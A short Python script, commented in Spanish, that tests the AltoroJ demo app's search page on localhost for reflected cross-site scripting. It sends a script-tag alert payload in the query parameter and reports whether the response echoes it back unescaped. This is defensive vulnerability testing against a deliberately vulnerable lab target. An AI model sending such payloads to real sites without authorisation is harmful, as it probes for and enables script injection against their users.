import requests
from bs4 import BeautifulSoup

# Define la URL de AltoroJ
url = "http://localhost:8080/AltoroJ/search.jsp"

# Payload para XSS
payload = "<script>alert('Cross site scripting test');</script>"

#Solicitud GET
query_param = "?query=" + payload
response = requests.get(url + query_param)

#Respuesta HTML
soup = BeautifulSoup(response.text, 'html.parser')

#Respuesta GET

if payload in str(soup):
    print("1")
else:
    print("0")
